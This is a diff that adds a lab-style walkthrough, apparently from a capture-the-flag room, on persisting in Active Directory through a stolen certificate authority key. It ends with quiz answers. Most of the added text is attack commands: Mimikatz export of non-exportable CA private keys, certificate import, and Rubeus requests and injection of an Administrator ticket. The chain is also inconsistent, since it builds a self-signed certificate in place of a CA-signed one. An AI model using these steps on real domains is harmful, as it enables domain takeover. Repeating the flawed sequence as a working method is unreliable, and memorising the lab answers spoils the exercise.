@@ -2020,4 +2020,86 @@ With the stolen CA certificate and key, attackers can use tools like ForgeCert t
 
 This method of persistence is one of the hardest to detect and mitigate, making it an ultimate backdoor into an enterprise environment.
 
+First, enumarate CA servers:
+
+```powershell
+Get-ADObject -Filter 'objectClass -eq "pKIEnrollmentService"' -Properties Name, dNSHostName
+```
+
+This lists all CA servers in the domain along with their hostnames.
+
+Once the CA server is identified, the next step is to determine whether its private key is accessible. Log in to the CA server (or a machine with admin access) and run: 
+
+```powershell
+certutil -store my
+```
+
+Running Mimikatz as NT AUTHORITY\SYSTEM, you can extract private keys even if they are marked as non-exportable:
+
+```
+crypto::capi
+crypto::certificates /export
+```
+
+If successful, a PFX file will be created containing the CA’s private key.
+
+Now that the CA’s private key has been extracted, it can be imported into any system to sign authentication certificates. Transfer the `CA_private.pfx` to `thmwrk1` and import it into the certificate store:
+
+```powershell
+certutil -importPFX CA_private.pfx
+```
+
+Once imported, you can forge legitimate certificates for users in the domain.
+
+Now that we control the CA private key, we can create an authentication certificate that grants domain access without a password.
+
+Create a certificate request:
+
+```powershell
+New-SelfSignedCertificate -Subject "CN=Attacker" -KeyAlgorithm RSA -KeyLength 2048 -CertStoreLocation "Cert:\CurrentUser\My"
+```
+
+Export the certificate:
+
+```powershell
+certutil -exportPFX my "<Thumbprint>" attacker_cert.pfx
+```
+
+Import it into the Windows certificate store:
+
+```powershell
+certutil -importPFX attacker_cert.pfx
+```
+
+Now, this certificate can be used for passwordless authentication.
+
+Now that we have a valid client authentication certificate, we can request a Kerberos Ticket-Granting Ticket (TGT). Use Rubeus to request a TGT with the stolen certificate:
+
+```powershell
+Rubeus asktgt /user:Administrator /certificate:attacker_cert.pfx
+```
+
+If successful, this will return a valid Kerberos TGT. Inject the TGT into the current session:
+
+```powershell
+Rubeus ptt /ticket:TGT_FILE
+```
+
+Verify authentication:
+
+```powershell
+klist
+```
+
+You should now see a valid Kerberos ticket without using a password.
+
+- What key is used to sign certificates to prove their authenticity?
+__private key__
+
+- What application can we use to forge a certificate if we have the CA certificate and private key?
+__`ForgeCert.exe`__
+
+- What is the Mimikatz command to pass a ticket from a file with the name of ticket.kirbi?
+__`kerberos::ptt ticket.kirbi`__
+
 
